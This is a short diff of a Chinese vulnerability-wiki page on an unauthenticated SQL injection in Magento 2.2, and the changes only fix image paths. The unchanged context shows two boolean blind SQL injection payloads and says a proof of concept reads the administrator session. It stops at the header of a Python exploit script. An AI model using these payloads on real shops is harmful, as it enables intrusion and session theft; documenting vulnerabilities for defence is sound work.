@@ -17,13 +17,13 @@ Magento 2.2
 
 可见，在执行`))) OR (SELECT 1 UNION SELECT 2 FROM DUAL WHERE 1=1) -- -`和`))) OR (SELECT 1 UNION SELECT 2 FROM DUAL WHERE 1=0) -- -`时，返回的HTTP状态码不同：
 
-![2.png](/Users/aresx/Documents/VulWiki/.resource/Magento2.2SQL注入漏洞/media/rId24.png)![3.png](/Users/aresx/Documents/VulWiki/.resource/Magento2.2SQL注入漏洞/media/rId25.png)
+![2.png](./.resource/Magento2.2SQL注入漏洞/media/rId24.png)![3.png](./.resource/Magento2.2SQL注入漏洞/media/rId25.png)
 
 通过改变OR的条件，即可实现SQL BOOL型盲注。
 
 利用POC，可以读取管理员的session：
 
-![4.png](/Users/aresx/Documents/VulWiki/.resource/Magento2.2SQL注入漏洞/media/rId26.png)
+![4.png](./.resource/Magento2.2SQL注入漏洞/media/rId26.png)
 
     #!/usr/bin/env python3
     # Magento 2.2.0 <= 2.3.0 Unauthenticated SQLi
